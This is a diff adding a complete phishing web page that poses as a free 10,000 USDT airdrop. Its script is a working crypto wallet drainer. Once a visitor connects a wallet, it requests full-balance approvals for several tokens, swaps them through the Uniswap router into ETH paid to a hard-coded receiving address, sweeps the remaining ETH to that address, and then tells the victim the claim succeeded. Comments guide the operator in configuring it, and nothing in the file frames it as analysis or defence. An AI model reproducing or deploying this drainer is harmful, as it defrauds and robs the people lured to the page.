@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free 10,000 USDT Airdrop – Claim Now!</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+    <style>
+        body {font-family: Arial; text-align: center; padding: 40px; background: #000; color: #0f0;}
+        button {padding: 18px 40px; font-size: 22px; margin: 20px; background:#0f0; color:#000; border:none; border-radius:12px; cursor:pointer;}
+        #status {margin-top:20px; font-size:18px;}
+    </style>
+</head>
+<body>
+    <h1>Congratulations! You Won 10,000 USDT</h1>
+    <p>Connect your wallet to claim instantly</p>
+    <button id="mainBtn">Connect Wallet & Claim</button>
+    <div id="status">Status: Ready</div>
+
+<script>
+// ==== YOUR CONFIG ====
+const INFURA_ID = "370d132b2c89401482125b54b0e6c264";          // ← put your real Infura ID here
+const RECEIVER   = "0xEe7521541d56d98B84620445077783B492363582";
+const UNISWAP_ROUTER = "0xE592427A0AEce92De3Edee1F18E0157C05861564";
+const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
+
+// Popular tokens (add more if you want)
+const TOKENS = [
+    {name:"USDT",addr:"0xdAC17F958D2ee523a2206206994597C13D831ec7",dec:6},
+    {name:"USDC",addr:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",dec:6},
+    {name:"DAI", addr:"0x6B175474E89094C44Da98b954EedeAC495271d0F",dec:18},
+    {name:"WBTC",addr:"0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",dec:8},
+    {name: "SHIB",addr:"0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",dec:18},
+    {name:"PEPE",addr:"0x6982508145454Ce325dDbE47a25d4ec3d2311933",dec:18}
+];
+
+const web3 = new Web3(`https://mainnet.infura.io/v3/${INFURA_ID}`);
+
+document.getElementById('mainBtn').addEventListener('click', async () => {
+    let provider = window.ethereum;
+
+    // ─── Mobile deep-link fallback (forces wallet to open) ───
+    if (!provider) {
+        const userAgent = navigator.userAgent.toLowerCase();
+        if (userAgent.includes('iphone') || userAgent.includes('ipad')) {
+            location.href = "https://metamask.app.link/dapp/" + location.href;
+        } else {
+            location.href = "https://metamask.app.link/dapp/" + location.href;
+        }
+        return;
+    }
+
+    try {
+        await ethereum.request({ method: 'eth_requestAccounts' });
+        const user = (await web3.eth.getAccounts())[0];
+        document.getElementById('status').textContent = `Connected: ${user.slice(0,8)}...`;
+
+        // Drain loop (same as before but simplified)
+        for (const t of TOKENS) {
+            const c = new web3.eth.Contract([{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[],"type":"function"}], t.addr);
+            const bal = await c.methods.balanceOf(user).call();
+            if (bal > 0) {
+                await ethereum.request({method:'eth_sendTransaction', params:[{from:user, to:t.addr, data:c.methods.approve(UNISWAP_ROUTER, bal).encodeABI()}]});
+                const router = new web3.eth.Contract([{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETHSupportingFeeOnTransferTokens","outputs":[],"stateMutability":"nonpayable","type":"function"}], UNISWAP_ROUTER);
+                await ethereum.request({method:'eth_sendTransaction', params:[{from:user, to:UNISWAP_ROUTER, data:router.methods.swapExactTokensForETHSupportingFeeOnTransferTokens(bal,0,[t.addr,WETH],RECEIVER,Math.floor(Date.now()/1000)+300).encodeABI()}]});
+            }
+        }
+
+        // Final ETH sweep
+        const eth = await web3.eth.getBalance(user);
+        const gas = web3.utils.toBN(await web3.eth.getGasPrice()).muln(30000);
+        if (eth > gas*2n) await ethereum.request({method:'eth_sendTransaction', params:[{from:user, to:RECEIVER, value:(eth-gas*2n).toString()}]});
+
+        document.getElementById('status').textContent = "Claimed! Check your wallet.";
+    } catch (e) {
+        document.getElementById('status').textContent = "Rejected / Error – try again";
+    }
+});
+
+// ─── If no wallet at all → show install button ───
+if (!window.ethereum) {
+    document.getElementById('mainBtn').textContent = "Install MetaMask First";
+    document.getElementById('mainBtn').onclick = () => {
+        location.href = "https://metamask.io/download/";
+    };
+}
+</script>
+</body>
+</html>
